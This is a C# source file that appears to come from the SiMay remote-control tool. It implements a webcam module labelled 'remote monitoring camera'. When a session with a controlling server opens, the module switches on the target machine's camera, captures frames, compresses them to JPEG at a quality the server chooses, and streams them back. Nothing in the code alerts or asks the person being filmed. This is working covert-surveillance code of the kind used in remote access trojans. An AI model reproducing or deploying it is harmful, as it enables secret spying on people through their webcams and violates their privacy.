using SiMay.Core;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;

using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Threading;

namespace SiMay.ServiceCore.ApplicationService
{
    [ServiceName("远程监控摄像头")]
    [ServiceKey("RemoteViedoJob")]
    public class VideoService : ServiceManagerBase
    {
        private int qty = 30;
        private bool isOpen = false;
        private AForgeViedo av;

        public override void SessionInitialized(TcpSocketSaeaSession session)
        {
            this.Init();
        }

        public override void SessionClosed()
        {
            if (isOpen)
            {
                isOpen = false;
                Closecamera();
            }
        }
        private void Init()
        {
            try
            {
                av = new AForgeViedo();
                if (!av.Init())
                {
                    SendAsyncToServer(MessageHead.C_VIEDO_DEVICE_NOTEXIST);
                    return;
                }

                isOpen = true;

                sendNextBitMap();
            }
            catch
            {
                SendAsyncToServer(MessageHead.C_VIEDO_DEVICE_NOTEXIST);
            }
        }

        private void Closecamera()
        {
            try
            {
                av.Dispose();
            }
            catch { }
        }

        private byte[] GetBitmapBytes()
        {
            try
            {
                int j = 0;
                while (true) //尝试10次无数据则未成功打开摄像头
                {
                    j++;
                    Bitmap value = av.GetBitmap();
                    if (value != null)
                    {
                        byte[] data = KiSaveAsJPEG(value, qty); //清晰度 15

                        if (data != null)
                            return data;
                    }
                    Thread.Sleep(1000);

                    if (j == 10)
                        return null;
                }
            }
            catch
            {
                return null;
            }
        }

        [PacketHandler(MessageHead.S_VIEDO_RESET)]
        public void SetBitQuality(TcpSocketSaeaSession session)
        {
            switch (session.CompletedBuffer.GetMessagePayload()[0])
            {
                case 3:
                    qty = 90;
                    break;

                case 2:
                    qty = 30;
                    break;

                case 1:
                    qty = 15;
                    break;
            }
        }

        [PacketHandler(MessageHead.S_VIEDO_GET_DATA)]
        public void SendBitMap(TcpSocketSaeaSession session)
            => this.sendNextBitMap();

        private void sendNextBitMap()
        {
            if (!isOpen)
                return;

            byte[] data = GetBitmapBytes();

            if (data == null)
            {
                Closecamera();
                CloseSession();
                return;
            }

            SendAsyncToServer(MessageHead.C_VIEDO_DATA, data);
        }


        private Bitmap SizeImage(Image srcImage, int iWidth, int iHeight)
        {

            try
            {
                Bitmap b = new Bitmap(iWidth, iHeight);
                Graphics g = Graphics.FromImage(b);

                g.InterpolationMode = InterpolationMode.HighQualityBicubic;
                g.DrawImage(srcImage, new Rectangle(0, 0, iWidth, iHeight), new Rectangle(0, 0, srcImage.Width, srcImage.Height), GraphicsUnit.Pixel);
                g.Dispose();
                return b;
            }
            catch
            {
                return null;
            }
        }

        ImageCodecInfo _ici;
        private byte[] KiSaveAsJPEG(Bitmap bmp, int Qty)
        {
            try
            {
                if (_ici == null)
                {
                    ImageCodecInfo[] CodecInfo = ImageCodecInfo.GetImageEncoders();
                    foreach (ImageCodecInfo ici in CodecInfo)
                    {
                        if (ici.MimeType.Equals("image/jpeg"))
                        {
                            _ici = ici;
                            break;
                        }
                    }
                    if (_ici == null) return null;
                }

                byte[] Bytes;
                using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
                {
                    EncoderParameter p;
                    EncoderParameters ps;

                    ps = new EncoderParameters(1);

                    p = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Qty);
                    ps.Param[0] = p;

                    SizeImage(bmp, 500, 400).Save(ms, _ici, ps);

                    Bytes = ms.ToArray();
                }
                return Bytes;
            }
            catch
            {
                return null;
            }
        }
    }
}